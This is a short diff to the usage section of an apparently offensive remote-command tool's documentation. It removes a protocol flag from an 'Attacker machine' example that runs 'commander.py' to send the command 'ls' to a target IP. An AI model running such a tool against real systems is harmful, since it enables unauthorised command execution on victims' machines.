@@ -67,7 +67,7 @@ The following is an example for the usage:
 - Attacker machine:
 
 ```
-sudo python3 commander.py -c ls -t 192.168.1.1 -dp 72 -d 10 -s 192.168.1.10 -p 72 -P TCP
+sudo python3 commander.py -c ls -t 192.168.1.1 -dp 72 -d 10 -s 192.168.1.10 -p 72
 ```
 
 - Victim machine:
